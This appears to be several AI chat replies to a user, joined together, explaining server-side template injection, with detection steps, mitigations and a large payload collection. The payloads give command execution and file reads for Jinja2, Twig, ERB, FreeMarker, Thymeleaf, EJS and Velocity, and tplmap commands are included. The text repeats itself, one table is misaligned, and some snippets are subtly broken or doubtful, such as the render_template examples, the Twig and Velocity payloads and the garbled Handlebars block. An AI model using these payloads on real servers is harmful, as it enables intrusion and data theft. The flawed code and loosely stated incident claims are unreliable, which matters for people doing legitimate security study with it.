### **Server-Side Template Injection (SSTI): A Comprehensive Explanation**

---

## **What is SSTI?**

**Server-Side Template Injection (SSTI)** is a vulnerability that occurs when an attacker injects malicious input into a web application's template engine, leading to arbitrary code execution on the server. Template engines (e.g., Jinja2, Twig, ERB) dynamically generate HTML, emails, or other content by embedding user inputs. If inputs are not properly sanitized, attackers can break out of the template context and execute server-side commands.

---

## **How SSTI Works**

1. **Template Engines**

   - Used by frameworks like Flask (Jinja2), Django (Django Templates), Ruby (ERB), and PHP (Twig).
   - Example (Jinja2):
     ```python
     Hello, {{ username }}!  <!-- Renders user input safely -->
     ```
   - If unsanitized, an attacker can inject template syntax:
     ```python
     {{ 7*7 }}  <!-- Output: 49 -->
     ```

2. **Exploitation**

   - **Step 1**: Identify the template engine (e.g., by probing with `{{ 7*7 }}` or `<%= 7*7 %>`).
   - **Step 2**: Break out of the sandbox and execute OS commands or read files.
     - **Jinja2 Exploit**:
       ```python
       {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
       ```
     - **Twig (PHP) Exploit**:
       ```php
       {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("cat /etc/passwd") }}
       ```

---

## **Types of SSTI**

1. **Plaintext Context**

   - User input is directly embedded in templates without sanitization.
   - Example:
     ```python
     render_template("Hello, " + username)  # Vulnerable if `username` is user-controlled
     ```

2. **Code Context**

   - User input is placed inside template expressions (e.g., `{{ ... }}`).
   - Example:
     ```python
     render_template(f"Hello, {username}")  # Vulnerable if `username` contains `{{ malicious_code }}`
     ```

---

## **Impact of SSTI**

- **Remote Code Execution (RCE)**: Execute arbitrary commands on the server.
- **Sensitive Data Exposure**: Read files (e.g., `/etc/passwd`, database credentials).
- **Application Takeover**: Compromise the server or pivot to internal systems.

---

## **How to Detect SSTI**

1. **Probe with Math Expressions**

   - Test inputs like `{{ 7*7 }}`, `<%= 7*7 %>`, or `${{7*7}}`.
   - If the output is `49`, SSTI is likely present.

2. **Identify the Engine**

   - Use payloads specific to common engines:
     - **Jinja2**: `{{ ''.__class__.__mro__ }}`
     - **Twig**: `{{ _self }}`
     - **ERB**: `<%= system("whoami") %>`

3. **Automated Tools**

   - **tplmap**:
     ```bash
     python tplmap.py -u "http://example.com/page?name=test"
     ```

---

## **Exploitation Examples**

### **1. Jinja2 (Python)**

```python
{{ ''.__class__.__mro__[1].__subclasses__()[401]('cat /etc/passwd', shell=True, stdout=-1).communicate() }}
```

- Lists all subclasses of `object` and exploits `subprocess.Popen` to run commands.

### **2. Twig (PHP)**

```php
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
```

- Calls PHP’s `system()` function to execute `id`.

### **3. ERB (Ruby)**

```erb
<%= system("cat /etc/passwd") %>
```

- Executes OS commands directly.

---

## **Mitigation**

1. **Avoid Concatenating User Input**

   ```python
   # Bad
   render_template("Hello, " + username)

   # Good
   render_template("index.html", name=username)
   ```

2. **Use Sandboxed Templates**

   - Restrict access to dangerous methods (e.g., `os`, `subprocess`).

3. **Whitelist Safe Inputs**

   - Allow only alphanumeric characters for usernames.

4. **Update Template Engines**

   - Patch known vulnerabilities (e.g., Jinja2 sandbox escapes).

---

## **Tools for SSTI Testing**

1. **tplmap** (Automated SSTI exploitation):
   ```bash
   python tplmap.py -u "http://example.com?name=test"
   ```
2. **Burp Suite** (Manual testing with payloads).

---

## **Real-World SSTI Attacks**

- **2016: Uber RCE via Flask/Jinja2**
  - Attackers exploited SSTI in Uber’s internal dashboard to gain admin access.
- **2017: Django Debug Toolbar Vulnerability**
  - Allowed SSTI through malicious HTTP headers.

---

### **Summary**

- **SSTI** lets attackers execute code by injecting template syntax.
- **Impact**: RCE, data leaks, server compromise.
- **Detection**: Probe with `{{ 7*7 }}` or use `tplmap`.
- **Prevention**: Sanitize inputs, avoid dynamic template generation.

Would you like a step-by-step demo of exploiting SSTI in a lab environment?

Alright Ali — let’s break down **SSTI** from the ground up so you understand exactly what it is, how it works, and why it’s dangerous.

---

## 📌 What is SSTI?

**SSTI** stands for **Server-Side Template Injection** .

It’s a vulnerability that happens when **user-controlled input** is embedded directly into a **server-side template** without proper sanitization.

- **Template engines** are used in many web frameworks to generate dynamic HTML or other content.
- They allow developers to insert placeholders like `{{username}}` or `<%= name %>` into templates, which get replaced with real data at runtime.
- If an attacker can inject **template syntax** into these placeholders, they can make the template engine **execute arbitrary code** on the server.

---

## 🛠 How It Works

1. **Normal use** :

   Template:

```html
<h1>Hello {{username}}</h1>
```

Input: `Ali` → Output: `Hello Ali`

1. **Vulnerable use** :

   If the app takes user input and directly passes it into the template without filtering:

```html
<h1>Hello {{ user_input }}</h1>
```

Input: `{{7*7}}` → Output: `Hello 49`

This means the template engine is **evaluating** the input — a sign of SSTI.

1. **Exploitation** :

   Depending on the template engine, attackers can:

- Read sensitive files (`/etc/passwd`)
- Access server-side objects
- Execute system commands (`ls`, `id`)
- Achieve **Remote Code Execution (RCE)**

---

## 🔍 Common Template Engines & Syntax

Different frameworks use different engines, each with its own syntax:

| Language   | Engine     | Example Injection |
| ---------- | ---------- | ----------------- |
| Python     | Jinja2     | `{{7*7}}`         |
| Ruby       | ERB        | `<%= 7*7 %>`      |
| PHP        | Twig       | `{{7*7}}`         |
| Java       | FreeMarker | `${7*7}`          |
| JavaScript | EJS        | `<%= 7*7 %>`      |

---

## 🎯 Why SSTI is Dangerous

- **Impact** : Often leads to **full server compromise** because template engines can access system-level functions.
- **Stealth** : Can be hidden inside normal-looking text.
- **Reach** : Affects many modern frameworks (Flask, Django, Rails, Symfony, Spring, etc.).

---

## 🧪 Detecting SSTI

1. **Fuzzing with math** :

   Send `{{7*7}}` or `<%=7*7%>` and see if the output is `49`.

2. **Engine fingerprinting** :

   Try syntax from different engines to see which one works.

3. **Escalation** :

   Once confirmed, try accessing objects or running commands.

---

## 🛡 Preventing SSTI

- **Never** pass raw user input into templates.
- Use **safe rendering functions** that escape variables.
- Apply **input validation** and allowlists.
- Keep template engines updated — some have sandboxing features.

---

💡 **In short:**

SSTI is like giving a stranger the keys to your kitchen — instead of just letting them write a greeting on the cake, they can open the oven, change the recipe, and even burn down the whole house.

---

Alright Ali — let’s go through **SSTI payload examples** for different template engines, then wrap it up with a **final, complete explanation** so you have the whole picture.

---

## 🧪 Common SSTI Payload Examples by Template Engine

Different frameworks use different template engines, so the syntax changes. Here’s a quick reference:

| Language / Framework                | Template Engine   | Test Payload (Math)                                       | Escalation Payload (RCE)                               |     |
| ----------------------------------- | ----------------- | --------------------------------------------------------- | ------------------------------------------------------ | --- | --- |
| **Python / Flask, Django (Jinja2)** | `{{7*7}}`→`49`    | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |                                                        |     |
| **Python / Tornado**                | Tornado Templates | `{{7*7}}`                                                 | `{% import os %}{{ os.system('id') }}`                 |     |
| **Ruby / Rails**                    | ERB               | `<%= 7*7 %>`                                              | `<%= system('id') %>`                                  |     |
| **PHP / Symfony, Laravel**          | Twig              | `{{7*7}}`                                                 | `{{ system('id') }}`                                   |     |
| **Java / Spring**                   | FreeMarker        | `${7*7}`                                                  | `${"freemarker.template.utility.Execute"?new()("id")}` |     |     |
| **Java / Thymeleaf**                | Thymeleaf         | `[[${7*7}]]`                                              | `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]`  |     |     |
| **JavaScript / Node.js**            | EJS               | `<%= 7*7 %>`                                              | `<%= require('child_process').execSync('id') %>`       |     |

---

## 🔍 How to Use These Payloads in Testing

1. **Detection Phase**
   - Inject a harmless math expression (`{{7*7}}`, `<%=7*7%>`, `${7*7}`) into any input that appears in the rendered page.
   - If the output shows `49`, `49.0`, or similar, the template engine is evaluating your input.
2. **Fingerprinting the Engine**
   - Try syntax from different engines to see which one works.
   - This tells you which payload style to use for exploitation.
3. **Exploitation Phase**
   - Once confirmed, escalate to reading files or executing commands.
   - Example (Jinja2):
     ```jinja2
     {{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
     ```

---

## 🛡 Why SSTI Is Dangerous

- **Direct path to RCE** : Many template engines expose functions that can run system commands.
- **Bypasses normal input validation** : Because the injection happens inside server-side rendering logic.
- **Affects multiple languages** : Python, PHP, Ruby, Java, JavaScript — all have vulnerable engines if misused.

---

## ⚠️ Real-World Example

In 2016, a vulnerability in a Flask/Jinja2-based site allowed attackers to inject:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

This gave them full shell access to the server.

---

## ✅ Final Explanation

**Server-Side Template Injection (SSTI)** occurs when **untrusted user input** is embedded directly into a server-side template and **evaluated** by the template engine.

- **Step 1:** The attacker finds a place where their input is rendered by the template engine.
- **Step 2:** They test with harmless expressions to confirm code execution.
- **Step 3:** They escalate to reading sensitive files or executing OS commands.

**Impact:**

- Data theft (config files, credentials)
- Remote Code Execution (full server compromise)
- Pivoting into internal networks

**Prevention:**

- Never pass raw user input into templates.
- Use safe rendering functions that escape variables.
- Apply strict input validation and allowlists.
- Keep template engines updated and enable sandboxing if available.

---

Certainly! Below is a collection of **real-world SSTI payloads** for various template engines. These are commonly used in penetration testing (with proper authorization) to verify vulnerabilities.

**⚠️ Warning**: Only use these payloads in authorized environments. Unauthorized testing is illegal.

---

## **1. Universal Detection Payloads**

Test if SSTI exists by injecting basic expressions:

```python
{{7*7}}      <!-- Jinja2, Twig -->
<%= 7*7 %>    <!-- ERB (Ruby), ASP -->
${7*7}        <!-- Freemarker, Thymeleaf -->
#{7*7}        <!-- Velocity -->
7*7           <!-- Some JS templates -->
```

- **If the output is `49`, SSTI is likely present**.

---

## **2. Exploit Payloads by Engine**

### **A. Jinja2 (Python – Flask, Django)**

#### **Read Files**

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

#### **Remote Code Execution (RCE)**

```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

#### **List All Classes (Advanced Exploitation)**

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

- Helps identify useful classes (e.g., `subprocess.Popen`).

---

### **B. Twig (PHP)**

#### **Remote Code Execution**

```php
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
{{ _self.env.setCache("malicious_function","system") }}{{ _self.env.getCache("malicious_function")("cat /etc/passwd") }}
```

#### **Read Files**

```php
{{ file_get_contents('/etc/passwd') }}
```

---

### **C. ERB (Ruby – Rails, Sinatra)**

#### **Execute OS Commands**

```erb
<%= `id` %>
<%= system('cat /etc/passwd') %>
<%= IO.popen('whoami').readlines %>
```

#### **Read Files**

```erb
<%= File.read('/etc/passwd') %>
```

---

### **D. Freemarker (Java)**

#### **RCE (Java Runtime)**

```freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami") }
```

---

### **E. Velocity (Java)**

#### **RCE (Limited by Sandbox)**

```velocity
#set($exec = "Runtime.getRuntime().exec('id')")
$exec.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')
```

---

### **F. Handlebars (JavaScript – NodeJS)**

#### **Limited Exploitation (No Direct RCE)**

```handlebars
{{#with "e"}}
  {{#with split as |code|}}
    {{#each (lookup (lookup this "_dynamicroot_0") "constructor")}}
      {{#if (eq code "return require('child_process').execSync('id');")}}
        {{this}}
      {{/if}}
    {{/each}}
  {{/with}}
{{/with}}
```

- NodeJS requires prototype pollution for RCE.

---

## **3. Tools for SSTI Exploitation**

1. **`tplmap`** (Auto-detects & exploits SSTI)
   ```bash
   python tplmap.py -u "http://vuln-site.com/?name=test"
   ```
2. **Burp Suite** (Manual testing with payloads).

---

## **4. Defensive Measures**

1. **Never concatenate user input into templates**

   ```python
   # UNSAFE (concatenation):
   template = "Hello, " + username

   # SAFE (context-aware rendering):
   render_template("greeting.html", name=username)
   ```

2. **Sandbox the template engine** (disable dangerous methods).
3. **Use strict allowlists** for dynamic templates.

---

## **Real-World Examples**

- **Uber (2016)**: Exploited Jinja2 SSTI for internal dashboard access.
- **Algolia (2018)**: Twig SSTI in a Symfony app led to RCE.

---
